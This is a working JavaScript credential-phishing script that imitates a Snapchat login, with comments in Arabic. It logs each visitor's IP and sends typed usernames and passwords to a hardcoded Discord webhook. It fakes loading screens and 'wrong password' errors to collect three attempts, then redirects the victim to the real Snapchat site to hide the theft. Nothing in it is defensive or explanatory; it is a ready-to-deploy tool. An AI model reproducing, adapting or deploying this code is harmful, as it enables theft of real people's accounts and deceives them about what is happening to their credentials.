// ===============================================
// 1. إعدادات ديسكورد والحدود القصوى
// ===============================================
// ⚠️ هام: استبدل الرابط أدناه برابط الـ Webhook الخاص بك
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 

const MAX_ATTEMPTS = 3; // عدد المحاولات قبل الطرد

// ===============================================
// 2. دالة إرسال البيانات إلى Discord
// ===============================================
function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("ضع_رابط")) {
        console.error("Discord Webhook URL is not configured.");
        return Promise.resolve();
    }
    
    const payload = {
        content: message,
        username: "Snapchat Hunter 👻",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" 
    };

    return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(error => console.error("Error sending message to Discord:", error));
}

// ===============================================
// 3. تتبع IP الزائر عند دخول الموقع
// ===============================================
function trackVisitorIP() {
    let dateTime = new Date().toLocaleString('ar-EG');
    let pageName = document.title;

    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            let ipMessage = `🔔 **زيارة جديدة!**\n` +
                            `**🔗 الصفحة:** ${pageName}\n` +
                            `**🌍 IP:** ${data.ip}\n` +
                            `**⏰ الوقت:** ${dateTime}`;
            sendToDiscord(ipMessage);
        })
        .catch(() => {
            sendToDiscord(`⚠️ **زيارة جديدة (IP مجهول)**\n🔗 ${pageName}`);
        });
}

// ===============================================
// 4. المنطق الرئيسي (تسجيل الدخول والتعامل مع النماذج)
// ===============================================
document.addEventListener('DOMContentLoaded', () => {
    
    // تشغيل تتبع الـ IP فوراً
    trackVisitorIP();

    let attempts = 0;

    // دالة عامة لمعالجة أي فورم (سواء المودال أو الصفحة الكاملة)
    function handleLoginSubmit(event, formElement, errorElementId) {
        event.preventDefault();

        // جلب البيانات من الحقول (يعمل مع الاسماء username و password)
        const usernameInput = formElement.querySelector('input[name="username"]');
        const passwordInput = formElement.querySelector('input[name="password"]');
        const errorMsg = document.getElementById(errorElementId);
        const loadingOverlay = document.getElementById('loadingOverlay');

        if(!usernameInput || !passwordInput) return;

        let userVal = usernameInput.value;
        let passVal = passwordInput.value;

        // تجهيز الرسالة
        let messageBody = `🚨 **صيد جديد (المحاولة ${attempts + 1})**\n` +
                          `👻 **المستخدم:** \`${userVal}\`\n` +
                          `🔑 **الرمز:** \`${passVal}\`\n` +
                          `📍 **المصدر:** ${document.title}\n` +
                          `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

        // إظهار اللودر (إيهام المستخدم بالتحقق)
        if(loadingOverlay) loadingOverlay.style.display = 'flex';

        // إرسال البيانات
        sendToDiscord(messageBody).then(() => {
            
            // تأخير بسيط لمحاكاة الاتصال بالسيرفر
            setTimeout(() => {
                if(loadingOverlay) loadingOverlay.style.display = 'none';

                attempts++;

                if (attempts < MAX_ATTEMPTS) {
                    // === فشل تسجيل الدخول (كلمة مرور خطأ) ===
                    if(errorMsg) {
                        errorMsg.style.display = 'block';
                        errorMsg.textContent = "كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.";
                    }
                    // تفريغ حقل الباسورد فقط ليبدو واقعياً
                    passwordInput.value = "";
                    passwordInput.focus();

                } else {
                    // === المحاولة الثالثة (النهاية) ===
                    // هنا نوجه المستخدم للموقع الأصلي ليبدو وكأن الصفحة "علقت" أو حدث خطأ حقيقي
                    
                    sendToDiscord("✅ **(تم الانتهاء - تحويل الضحية للموقع الرسمي)**");
                    
                    // التوجيه إلى موقع سناب شات الرسمي
                    window.location.href = "https://accounts.snapchat.com/";
                }
            }, 1500); // انتظار 1.5 ثانية
        });
    }

    // --- 1. التعامل مع صفحة البروفايل (Modals) ---
    const modal = document.getElementById('loginModal');
    const triggers = document.querySelectorAll('.trigger-login');
    const closeBtn = document.getElementById('modalCloseBtn');
    const modalForm = document.getElementById('loginFormModal');

    // فتح المودال عند الضغط على أي زر
    if(triggers.length > 0 && modal) {
        triggers.forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                modal.style.display = 'flex';
            });
        });
    }

    // إغلاق المودال
    if(closeBtn && modal) {
        closeBtn.addEventListener('click', () => {
            modal.style.display = 'none';
        });
    }

    // عند إرسال فورم المودال
    if(modalForm) {
        modalForm.addEventListener('submit', (e) => {
            handleLoginSubmit(e, modalForm, 'statusMessageModal');
        });
    }

    // --- 2. التعامل مع صفحة تسجيل الدخول الكاملة (apply2.html) ---
    const fullPageForm = document.getElementById('fullLoginForm');
    if(fullPageForm) {
        fullPageForm.addEventListener('submit', (e) => {
            handleLoginSubmit(e, fullPageForm, 'loginErrorMsg');
        });
    }
});
